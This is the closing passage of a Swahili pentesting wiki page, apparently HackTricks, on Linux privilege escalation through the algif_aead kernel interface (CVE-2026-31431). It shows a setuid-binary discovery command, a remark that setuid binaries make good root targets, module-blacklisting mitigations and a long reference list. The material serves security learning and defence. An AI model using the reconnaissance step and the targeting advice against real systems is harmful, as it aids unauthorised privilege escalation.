find / -perm -4000 -type f 2>/dev/null
```

Thamani za usanidi zilizo hapa chini hutofautisha kiolesura kinachoweza kupakiwa na kilichojengwa ndani ya kernel; sheria za ujenzi wa crypto huunganisha `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kuondolewa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: kiolesura kimejengwa ndani ya kernel
- binaries za setuid ni malengo mazuri kwa sababu patch ya page-cache-only inaweza kutosha kugeuza foothold ya ndani kuwa root

#### Kupunguza attack surface ya njia ya `algif_aead`

Ikiwa kiolesura chenye athari za udhaifu kinatolewa na module inayoweza kupakiwa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Ikiwa imejumuishwa kwenye kernel, baadhi ya taarifa ziliripoti kuzuia njia ya init kwa kutumia:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Aina hii ya hatua ya kupunguza hatari inafaa kukumbukwa pia kwa LPE nyingine za kernel: ikiwa exploitation inategemea interface mahususi ya hiari, kuizima au kuiweka kwenye blacklist kunaweza kukatiza njia ya exploit hata kabla ya kupata toleo jipya kamili la kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – kuteka nyara script inayoendeshwa na root katika directory ya PaperCut inayoweza kuandikwa na mtumiaji](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — maswali yanayoulizwa mara kwa mara](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Taarifa ya ufichuaji ya Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Marekebisho ya Linux stable: crypto: algif_aead - Rejea kufanya kazi out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — ushauri wa CVE-2026-31431](https://copy.fail/)
- [7] [Andiko la kiufundi la Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Hazina ya DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Kuchambua na kutumia variant ya Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Marekebisho ya Linux: net: skb: kuhifadhi `SKBFL_SHARED_FRAG` katika `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Hatua ya awali ya kupunguza hatari ya Linux: kuweka `SKBFL_SHARED_FRAG` kwa pakiti za UDP zilizopitishwa kwa splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — ukurasa wa mwongozo wa Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Uhusishaji wa Programu za MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Ufafanuzi wa Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Ufafanuzi wa Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Lugha ya Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile ya Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Athari ya Linux kernel AF_ALG kwenye page cache](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Nyaraka za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Nyaraka za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Nyaraka za systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Uhandisi wa Ugunduzi wa Linux: mbinu za persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
